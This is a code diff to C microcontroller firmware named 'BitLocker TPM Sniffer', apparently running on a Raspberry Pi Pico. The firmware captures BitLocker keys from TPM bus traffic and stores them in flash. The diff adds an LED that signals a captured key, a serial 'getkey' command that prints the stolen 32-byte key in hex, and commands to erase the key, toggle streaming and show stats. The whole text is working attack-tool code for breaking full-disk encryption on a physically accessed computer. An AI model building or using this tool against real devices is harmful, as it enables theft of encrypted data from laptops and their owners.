@@ -15,6 +15,8 @@
 #define PIN_SPI0_SCK  1
 #define PIN_SPI0_MOSI 2
 #define PIN_SPI0_MISO 3
+#define LED_PIN 25
+
 
 #define TPM_BITLOCKER_ADDR 0x00D40024
 #define KEY_PATTERN_LEN 44
@@ -112,11 +114,15 @@ void processCommand(const char* cmd);
 int main() {
     stdio_init_all();
     setbuf(stdout, NULL);
+    gpio_init(LED_PIN);
+    gpio_set_dir(LED_PIN, GPIO_OUT);
+    gpio_put(LED_PIN, 0);  // Start with LED off
     printf("\n=== BitLocker TPM Sniffer ===\n");
 
     uint8_t boot_key[KEY_DATA_LEN];
     if (flash_retrieve_key(boot_key)) {
         printf("\n[!!!] STORED KEY DETECTED AT BOOT\n");
+        gpio_put(LED_PIN, 1);
     }
 
     // PIO Setup
@@ -204,6 +210,7 @@ int main() {
             restore_interrupts(ints);
 
             printf("\n[[[ !!! KEY FOUND AND STORED !!! ]]]\n");
+            gpio_put(LED_PIN, 1);
         }
     }
 }
@@ -307,30 +314,55 @@ bool checkAndStoreKey(uint8_t* buffer, int len) {
 }
 
 void processCommand(const char* cmd) {
-    uint32_t ints = save_and_disable_interrupts();
-
     if (strcmp(cmd, "status") == 0) {
+        uint32_t ints = save_and_disable_interrupts();
         uint32_t tp = transactions_processed;
         uint32_t kf = keys_found;
         restore_interrupts(ints);
         printf("Transactions: %lu\nKeys Found: %lu\n", tp, kf);
-    } else if (strcmp(cmd, "stream on") == 0) {
-        stream_active = true;
+    }
+    else if (strcmp(cmd, "getkey") == 0) {
+        uint8_t key[32];
+        if (flash_retrieve_key(key)) {
+            printf("[+] Stored BitLocker Key: ");
+            for (int i = 0; i < 32; i++) printf("%02X", key[i]);
+            printf("\n");
+        } else {
+            printf("[-] No key stored in flash\n");
+        }
+    }
+    else if (strcmp(cmd, "erasekey") == 0) {
+        flash_erase_key();
+        printf("[*] Key erased from flash\n");
+        gpio_put(LED_PIN, 0);  // LED off when key erased
+    }
+    else if (strcmp(cmd, "stream") == 0) {
+        uint32_t ints = save_and_disable_interrupts();
+        stream_active = !stream_active;
         restore_interrupts(ints);
-    } else if (strcmp(cmd, "stream off") == 0) {
-        stream_active = false;
+        printf("[*] Streaming %s\n", stream_active ? "ON" : "OFF");
+    }
+    else if (strcmp(cmd, "stats") == 0) {
+        uint32_t ints = save_and_disable_interrupts();
+        int wl = win_len;
         restore_interrupts(ints);
-    } else if (strcmp(cmd, "clear") == 0) {
+        printf("Window Len: %d\n", wl);
+    }
+    else if (strcmp(cmd, "clear") == 0) {
+        uint32_t ints = save_and_disable_interrupts();
         transactions_processed = 0;
         keys_found = 0;
         win_len = 0;
         restore_interrupts(ints);
-    } else if (strcmp(cmd, "reset") == 0) {
+    }
+    else if (strcmp(cmd, "reset") == 0) {
+        uint32_t ints = save_and_disable_interrupts();
         machine_state.state = STATE_IDLE;
         machine_state.data_count = 0;
         win_len = 0;
         restore_interrupts(ints);
-    } else {
-        restore_interrupts(ints);
+    }
+    else {
+        printf("Commands are: status, getkey, erasekey, stream, stats, clear, reset.\n");
     }
 }
